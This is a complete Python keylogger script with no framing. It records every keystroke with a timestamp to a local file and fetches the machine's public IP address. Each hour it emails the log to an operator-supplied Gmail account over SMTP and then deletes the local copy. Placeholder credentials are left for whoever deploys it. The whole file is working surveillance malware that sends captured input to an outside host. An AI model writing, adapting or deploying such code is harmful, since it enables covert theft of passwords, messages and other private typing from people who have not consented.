from pynput.keyboard import Listener
from email.message import EmailMessage
import smtplib
import time
import os
import requests

class keylogger:

    def __init__(self, emailAddress, password):
        self.start_time = time.time()
        self.email = emailAddress
        self.password = password
        self.ip = requests.request('GET', 'https://api.ipify.org').text
        self.emailInterval = 3600
        self.logFile = "keylogs.txt"

    def keystroke_handler(self, key):
        dateTime = time.strftime("%m/%d/%Y %H:%M:%S")
        format = f'{dateTime}: {key}\n'
        with open(f"{self.logFile}", "a") as keylogFile:
            keylogFile = open("keylogs.txt", "a")
            keylogFile.write(format)

        if (time.time() - self.start_time) > self.emailInterval:
            try:
                keylogger.send_email(self)
                print("Email sent successfully!")
            except smtplib.SMTPServerDisconnected:
                print("Error: The server unexpectedly disconnected!")
            except smtplib.SMTPSenderRefused:
                print("Error: Sender address refused.")
            except smtplib.SMTPDataError:
                print("Error: The SMTP server refused to accept the message data.")
            except smtplib.SMTPConnectError:
                print("Error: Failed to establish a connection with the server.")
            except smtplib.SMTPAuthenticationError:
                print("Error: SMTP authentication went wrong. Most probably the server did not accept the username/password combination provided.")
            except Exception as e:
                print(e)

            os.remove("keylogs.txt")
            self.start_time = time.time()

    def send_email(self):
        
        dateTime = time.strftime("%m/%d/%Y %H:%M:%S")
        message = EmailMessage()
        message['Subject'] = f'Keylogs for {self.ip} - {dateTime}'
        message['From'] = self.email
        message['To'] = self.email
        message.add_attachment(open("keylogs.txt", "r").read(), filename="keylogs.txt")

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.send_message(message)
        server.quit()

    def main(self):
        with Listener(on_press=keylogger(self.email, self.password).keystroke_handler) as listener:
            listener.join()

keylogger("YOUREMAIL@gmail.com", "YOURPASSWORD").main()
